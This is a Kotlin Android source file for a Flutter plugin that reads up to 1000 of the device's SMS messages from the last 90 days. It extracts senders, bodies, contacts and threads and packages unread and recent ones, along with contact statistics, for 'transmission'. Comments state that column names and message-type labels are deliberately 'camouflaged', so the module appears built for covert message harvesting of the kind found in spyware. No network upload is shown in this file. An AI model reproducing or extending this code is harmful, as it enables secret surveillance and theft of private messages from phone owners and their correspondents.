package com.example.kem

import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.provider.Telephony
import android.util.Log
import android.Manifest
import androidx.core.content.ContextCompat
import io.flutter.plugin.common.MethodChannel
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*

// ==================== BASE UTILITIES ====================
/**
 * أدوات أساسية مشتركة
 * Shared base utilities
 */
object BaseUtils {
    const val LOG_TAG = "MessageManager"
    
    // حدود الأداء - Performance limits
    const val MAX_MESSAGE_LIMIT = 1000
    const val CONTENT_PREVIEW_LENGTH = 200
    const val BATCH_PROCESSING_SIZE = 50
    const val RECENT_MESSAGES_DAYS = 90
    const val COMPRESSION_THRESHOLD = 1024
    const val BATCH_UPLOAD_SIZE = 10
    
    // فحص الصلاحيات الموحد
    fun checkPermission(context: Context, permission: String): Boolean {
        return ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED
    }
    
    // معالج الأخطاء الموحد
    fun createErrorResponse(status: String, message: String, timestamp: Long = System.currentTimeMillis()): JSONObject {
        return JSONObject().apply {
            put("status", status)
            put("message", message)
            put("timestamp", timestamp)
            put("optimization_applied", false)
        }
    }
    
    // منسق الوقت الموحد
    fun formatTimestamp(timestamp: Long): String {
        return try {
            val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
            dateFormat.format(Date(timestamp))
        } catch (e: Exception) {
            "Invalid Timestamp"
        }
    }
    
    // منظف النصوص الموحد
    fun sanitizeText(text: String?, maxLength: Int = CONTENT_PREVIEW_LENGTH): String {
        return text?.trim()?.take(maxLength)?.replace(Regex("[\\p{Cntrl}&&[^\r\n\t]]"), "") ?: ""
    }
    
    // منظف عناوين الاتصال الموحد
    fun sanitizeAddress(address: String?, maxLength: Int = 50): String {
        return address?.replace(Regex("[^\\d+\\-\\s\\(\\)@.]"), "")?.take(maxLength) ?: "Unknown Endpoint"
    }
    
    // فحص الرقم التعريفي الموحد
    fun isValidId(id: String?): Boolean {
        return !id.isNullOrBlank() && id.matches(Regex("\\d+"))
    }
    
    // فحص العنوان الموحد
    fun isValidAddress(address: String?): Boolean {
        return !address.isNullOrBlank() && 
               (address.matches(Regex("[+\\d\\s\\-()]+")) || address.contains("@"))
    }
    
    // فحص الرسائل الحديثة الموحد
    fun isRecentMessage(timestamp: Long, daysThreshold: Int = RECENT_MESSAGES_DAYS): Boolean {
        val cutoffTime = System.currentTimeMillis() - (daysThreshold * 24 * 60 * 60 * 1000L)
        return timestamp > cutoffTime
    }
}

// ==================== TYPE DECODER ====================
/**
 * فك ترميز الأنواع الموحد
 * Unified type decoder
 */
object TypeDecoder {
    
    fun <T> decodeWithMapping(type: T, mappings: Map<T, String>, defaultValue: String = "unknown"): String {
        return try {
            mappings[type] ?: defaultValue
        } catch (e: Exception) {
            Log.w(BaseUtils.LOG_TAG, "Error decoding type: $type", e)
            defaultValue
        }
    }
}

// ==================== MESSAGE CONSTANTS ====================
/**
 * ثوابت الرسائل النصية
 * SMS constants
 */
object MessageConstants {
    
    // أعمدة مموهة - Camouflaged columns
    object CommunicationColumns {
        const val RECORD_IDENTIFIER = Telephony.Sms._ID
        const val THREAD_REFERENCE = Telephony.Sms.THREAD_ID
        const val ENDPOINT_ADDRESS = Telephony.Sms.ADDRESS
        const val CONTENT_BODY = Telephony.Sms.BODY
        const val TIMESTAMP_RECEIVED = Telephony.Sms.DATE
        const val TIMESTAMP_SENT = Telephony.Sms.DATE_SENT
        const val MESSAGE_TYPE = Telephony.Sms.TYPE
        const val READ_STATUS = Telephony.Sms.READ
        const val DELIVERY_STATUS = Telephony.Sms.STATUS
        const val CONTACT_PERSON = Telephony.Sms.PERSON
        const val SERVICE_CENTER = Telephony.Sms.SERVICE_CENTER
        const val SUBJECT_LINE = Telephony.Sms.SUBJECT
    }
    
    // تعيينات مموهة - Camouflaged mappings
    val MESSAGE_FLOW_TYPES = mapOf(
        Telephony.Sms.MESSAGE_TYPE_INBOX to "incoming_communication",
        Telephony.Sms.MESSAGE_TYPE_SENT to "outgoing_transmission",
        Telephony.Sms.MESSAGE_TYPE_DRAFT to "pending_composition",
        Telephony.Sms.MESSAGE_TYPE_OUTBOX to "queued_transmission",
        Telephony.Sms.MESSAGE_TYPE_FAILED to "failed_delivery",
        Telephony.Sms.MESSAGE_TYPE_QUEUED to "pending_delivery"
    )
    
    val READ_STATE_TYPES = mapOf(
        0 to "unread_content",
        1 to "read_content"
    )
    
    val DELIVERY_STATE_TYPES = mapOf(
        -1 to "status_unknown",
        0 to "delivery_complete", 
        32 to "delivery_pending",
        64 to "delivery_failed"
    )
    
    // إسقاطات محسنة - Optimized projections
    val ESSENTIAL_PROJECTION = arrayOf(
        CommunicationColumns.RECORD_IDENTIFIER,
        CommunicationColumns.THREAD_REFERENCE,
        CommunicationColumns.ENDPOINT_ADDRESS,
        CommunicationColumns.CONTENT_BODY,
        CommunicationColumns.TIMESTAMP_RECEIVED,
        CommunicationColumns.MESSAGE_TYPE,
        CommunicationColumns.READ_STATUS
    )
    
    val DETAILED_PROJECTION = arrayOf(
        CommunicationColumns.RECORD_IDENTIFIER,
        CommunicationColumns.THREAD_REFERENCE,
        CommunicationColumns.ENDPOINT_ADDRESS,
        CommunicationColumns.CONTENT_BODY,
        CommunicationColumns.TIMESTAMP_RECEIVED,
        CommunicationColumns.TIMESTAMP_SENT,
        CommunicationColumns.MESSAGE_TYPE,
        CommunicationColumns.READ_STATUS,
        CommunicationColumns.DELIVERY_STATUS,
        CommunicationColumns.CONTACT_PERSON,
        CommunicationColumns.SERVICE_CENTER,
        CommunicationColumns.SUBJECT_LINE
    )
    
    // فك ترميز أنواع الرسائل
    fun decodeMessageFlowType(type: Int): String = 
        TypeDecoder.decodeWithMapping(type, MESSAGE_FLOW_TYPES, "unknown_communication")
    
    fun decodeReadState(status: Int): String = 
        TypeDecoder.decodeWithMapping(status, READ_STATE_TYPES, "unknown_read_state")
    
    fun decodeDeliveryState(status: Int): String = 
        TypeDecoder.decodeWithMapping(status, DELIVERY_STATE_TYPES, "unknown_delivery_state")
}

// ==================== BASE DATA PROCESSOR ====================
/**
 * معالج البيانات الأساسي
 * Base data processor
 */
abstract class BaseDataProcessor(protected val context: Context) {
    
    protected fun safeExecute(operation: String, block: () -> JSONObject): JSONObject {
        return try {
            block()
        } catch (securityEx: SecurityException) {
            Log.e(BaseUtils.LOG_TAG, "Security error during $operation", securityEx)
            BaseUtils.createErrorResponse("security_error", "Access denied to $operation")
        } catch (generalEx: Exception) {
            Log.e(BaseUtils.LOG_TAG, "General error during $operation", generalEx)
            BaseUtils.createErrorResponse("extraction_error", "Failed to $operation")
        }
    }
    
    protected fun createSuccessResponse(data: Any, totalProcessed: Int): JSONObject {
        return JSONObject().apply {
            put("status", "success")
            put("extraction_timestamp", System.currentTimeMillis())
            put("total_processed", totalProcessed)
            put("data", data)
        }
    }
    
    protected fun executeQuery(
        uri: Uri,
        projection: Array<String>,
        selection: String? = null,
        selectionArgs: Array<String>? = null,
        sortOrder: String? = null,
        processor: (Cursor) -> JSONObject?
    ): List<JSONObject> {
        val results = mutableListOf<JSONObject>()
        try {
            context.contentResolver.query(uri, projection, selection, selectionArgs, sortOrder)?.use { cursor ->
                while (cursor.moveToNext()) {
                    try {
                        processor(cursor)?.let { results.add(it) }
                    } catch (e: Exception) {
                        Log.w(BaseUtils.LOG_TAG, "Error processing cursor row", e)
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(BaseUtils.LOG_TAG, "Database query failed", e)
        }
        return results
    }
}

// ==================== MESSAGE NETWORK OPTIMIZER ====================
/**
 * محسن الشبكة للرسائل
 * Message network optimizer
 */
class MessageNetworkOptimizer {
    
    fun optimizeDataForTransmission(messages: List<JSONObject>): JSONObject {
        return try {
            val statistics = generateStatistics(messages)
            val importantMessages = filterImportantMessages(messages)
            val compressedMessages = compressContent(importantMessages)
            
            JSONObject().apply {
                put("message_statistics", statistics)
                put("important_messages", JSONArray(compressedMessages))
                put("total_processed", messages.size)
                put("transmitted_count", compressedMessages.size)
                put("optimization_applied", true)
            }
        } catch (e: Exception) {
            Log.e(BaseUtils.LOG_TAG, "Data optimization failed", e)
            BaseUtils.createErrorResponse("optimization_error", "Failed to optimize data")
        }
    }
    
    private fun generateStatistics(messages: List<JSONObject>): JSONObject {
        val stats = JSONObject()
        
        var incomingCount = 0
        var outgoingCount = 0
        var unreadCount = 0
        var recentCount = 0
        val endpointFrequency = mutableMapOf<String, Int>()
        
        messages.forEach { message ->
            when (message.optString("communication_flow")) {
                "incoming_communication" -> incomingCount++
                "outgoing_transmission" -> outgoingCount++
            }
            
            if (message.optString("read_state") == "unread_content") {
                unreadCount++
            }
            
            if (BaseUtils.isRecentMessage(message.optLong("event_timestamp"), 7)) {
                recentCount++
            }
            
            val endpoint = message.optString("endpoint_address")
            endpointFrequency[endpoint] = endpointFrequency.getOrDefault(endpoint, 0) + 1
        }
        
        stats.put("incoming_messages", incomingCount)
        stats.put("outgoing_messages", outgoingCount)
        stats.put("unread_messages", unreadCount)
        stats.put("recent_messages_7days", recentCount)
        stats.put("unique_endpoints", endpointFrequency.size)
        stats.put("most_active_endpoint", endpointFrequency.maxByOrNull { it.value }?.key ?: "none")
        
        return stats
    }
    
    private fun filterImportantMessages(messages: List<JSONObject>): List<JSONObject> {
        return messages.filter { message ->
            message.optString("read_state") == "unread_content" ||
            BaseUtils.isRecentMessage(message.optLong("event_timestamp"), 7) ||
            message.optString("delivery_state") == "delivery_failed"
        }.take(BaseUtils.BATCH_UPLOAD_SIZE)
    }
    
    private fun compressContent(messages: List<JSONObject>): List<JSONObject> {
        return messages.map { message ->
            JSONObject().apply {
                put("id", message.optString("message_identifier"))
                put("from", BaseUtils.sanitizeAddress(message.optString("endpoint_address")))
                put("preview", BaseUtils.sanitizeText(message.optString("content_preview"), 50))
                put("time", message.optLong("event_timestamp"))
                put("type", message.optString("communication_flow"))
                put("read", message.optString("read_state"))
            }
        }
    }
}

// ==================== MESSAGE DATA COLLECTOR ====================
/**
 * جامع بيانات الرسائل
 * Message data collector
 */
class MessageDataCollector(context: Context) : BaseDataProcessor(context) {
    
    private val networkOptimizer = MessageNetworkOptimizer()
    
    fun extractCommunicationMessages(includeFullContent: Boolean = false): JSONObject {
        return safeExecute("message extraction") {
            if (!BaseUtils.checkPermission(context, Manifest.permission.READ_SMS)) {
                return@safeExecute BaseUtils.createErrorResponse("permission_denied", "Message access denied")
            }
            
            val rawMessages = if (includeFullContent) {
                extractDetailedMessages()
            } else {
                extractEssentialMessages()
            }
            
            val processedMessages = processBatchMessages(rawMessages)
            val optimizedData = networkOptimizer.optimizeDataForTransmission(processedMessages)
            
            JSONObject().apply {
                put("status", "success")
                put("extraction_timestamp", System.currentTimeMillis())
                put("optimization_applied", optimizedData.optBoolean("optimization_applied"))
                put("communication_data", optimizedData)
            }
        }
    }
    
    private fun extractEssentialMessages(): List<JSONObject> {
        val cutoffTime = System.currentTimeMillis() - (BaseUtils.RECENT_MESSAGES_DAYS * 24 * 60 * 60 * 1000L)
        
        return executeQuery(
            Telephony.Sms.CONTENT_URI,
            MessageConstants.ESSENTIAL_PROJECTION,
            "${MessageConstants.CommunicationColumns.TIMESTAMP_RECEIVED} > ?",
            arrayOf(cutoffTime.toString()),
            "${MessageConstants.CommunicationColumns.TIMESTAMP_RECEIVED} DESC LIMIT ${BaseUtils.MAX_MESSAGE_LIMIT}"
        ) { cursor -> createEssentialMessageObject(cursor) }
    }
    
    private fun extractDetailedMessages(): List<JSONObject> {
        val cutoffTime = System.currentTimeMillis() - (BaseUtils.RECENT_MESSAGES_DAYS * 24 * 60 * 60 * 1000L)
        
        return executeQuery(
            Telephony.Sms.CONTENT_URI,
            MessageConstants.DETAILED_PROJECTION,
            "${MessageConstants.CommunicationColumns.TIMESTAMP_RECEIVED} > ?",
            arrayOf(cutoffTime.toString()),
            "${MessageConstants.CommunicationColumns.TIMESTAMP_RECEIVED} DESC LIMIT ${BaseUtils.MAX_MESSAGE_LIMIT / 2}"
        ) { cursor -> createDetailedMessageObject(cursor) }
    }
    
    private fun createEssentialMessageObject(cursor: Cursor): JSONObject? {
        return try {
            val messageId = cursor.getString(cursor.getColumnIndexOrThrow(MessageConstants.CommunicationColumns.RECORD_IDENTIFIER))
            if (!BaseUtils.isValidId(messageId)) {
                return null
            }
            
            JSONObject().apply {
                put("message_identifier", messageId)
                put("thread_reference", cursor.getString(cursor.getColumnIndexOrThrow(MessageConstants.CommunicationColumns.THREAD_REFERENCE)) ?: "")
                put("endpoint_address", BaseUtils.sanitizeAddress(
                    cursor.getString(cursor.getColumnIndexOrThrow(MessageConstants.CommunicationColumns.ENDPOINT_ADDRESS))
                ))
                put("content_preview", BaseUtils.sanitizeText(
                    cursor.getString(cursor.getColumnIndexOrThrow(MessageConstants.CommunicationColumns.CONTENT_BODY))
                ))
                
                val timestamp = cursor.getLong(cursor.getColumnIndexOrThrow(MessageConstants.CommunicationColumns.TIMESTAMP_RECEIVED))
                put("event_timestamp", timestamp)
                put("formatted_time", BaseUtils.formatTimestamp(timestamp))
                
                put("communication_flow", MessageConstants.decodeMessageFlowType(
                    cursor.getInt(cursor.getColumnIndexOrThrow(MessageConstants.CommunicationColumns.MESSAGE_TYPE))
                ))
                put("read_state", MessageConstants.decodeReadState(
                    cursor.getInt(cursor.getColumnIndexOrThrow(MessageConstants.CommunicationColumns.READ_STATUS))
                ))
            }
        } catch (e: Exception) {
            Log.e(BaseUtils.LOG_TAG, "Error creating essential message object", e)
            null
        }
    }
    
    private fun createDetailedMessageObject(cursor: Cursor): JSONObject? {
        val messageObj = createEssentialMessageObject(cursor) ?: return null
        
        return try {
            val sentTimestamp = cursor.getLong(cursor.getColumnIndexOrThrow(MessageConstants.CommunicationColumns.TIMESTAMP_SENT))
            if (sentTimestamp > 0) {
                messageObj.put("sent_timestamp", sentTimestamp)
                messageObj.put("sent_formatted_time", BaseUtils.formatTimestamp(sentTimestamp))
            }
            
            messageObj.put("delivery_state", MessageConstants.decodeDeliveryState(
                cursor.getInt(cursor.getColumnIndexOrThrow(MessageConstants.CommunicationColumns.DELIVERY_STATUS))
            ))
            messageObj.put("contact_reference", cursor.getString(cursor.getColumnIndexOrThrow(MessageConstants.CommunicationColumns.CONTACT_PERSON)) ?: "")
            messageObj.put("service_center", cursor.getString(cursor.getColumnIndexOrThrow(MessageConstants.CommunicationColumns.SERVICE_CENTER)) ?: "")
            messageObj.put("subject_line", cursor.getString(cursor.getColumnIndexOrThrow(MessageConstants.CommunicationColumns.SUBJECT_LINE)) ?: "")
            
            messageObj
        } catch (e: Exception) {
            Log.e(BaseUtils.LOG_TAG, "Error creating detailed message object", e)
            messageObj
        }
    }
    
    private fun processBatchMessages(rawMessages: List<JSONObject>): List<JSONObject> {
        val processedMessages = mutableListOf<JSONObject>()
        
        rawMessages.chunked(BaseUtils.BATCH_PROCESSING_SIZE).forEach { batch ->
            try {
                val processedBatch = batch.mapNotNull { message ->
                    if (BaseUtils.isValidAddress(message.optString("endpoint_address"))) {
                        message
                    } else null
                }
                processedMessages.addAll(processedBatch)
            } catch (e: Exception) {
                Log.w(BaseUtils.LOG_TAG, "Error processing message batch", e)
            }
        }
        
        return processedMessages
    }
}

// ==================== MESSAGE MANAGER ====================
/**
 * مدير الرسائل الرئيسي
 * Main message manager
 */
class MessageManager(private val context: Context) {
    
    private val messageDataCollector = MessageDataCollector(context)
    
    suspend fun handleExtractCommunicationMessages(
        result: MethodChannel.Result,
        includeFullContent: Boolean = false,
        optimizeForNetwork: Boolean = true
    ) {
        withContext(Dispatchers.IO) {
            try {
                Log.d(BaseUtils.LOG_TAG, "Starting message extraction - Full content: $includeFullContent, Optimize: $optimizeForNetwork")
                
                val messagesData = messageDataCollector.extractCommunicationMessages(includeFullContent)
                
                withContext(Dispatchers.Main) {
                    result.success(messagesData.toString())
                }
                
                Log.i(BaseUtils.LOG_TAG, "Message extraction completed successfully")
                
            } catch (securityEx: SecurityException) {
                Log.e(BaseUtils.LOG_TAG, "Security error during message extraction", securityEx)
                withContext(Dispatchers.Main) {
                    result.error("SECURITY_ERROR", "Access denied to message data", securityEx.message)
                }
            } catch (generalEx: Exception) {
                Log.e(BaseUtils.LOG_TAG, "General error during message extraction", generalEx)
                withContext(Dispatchers.Main) {
                    result.error("EXTRACTION_ERROR", "Failed to extract message data", generalEx.message)
                }
            }
        }
    }
    
    fun hasMessagePermission(): Boolean {
        return BaseUtils.checkPermission(context, Manifest.permission.READ_SMS)
    }
    
    fun getMessageStatus(): JSONObject {
        return JSONObject().apply {
            put("permission_granted", hasMessagePermission())
            put("timestamp", System.currentTimeMillis())
            put("message_provider", "Android SMS Provider")
        }
    }
}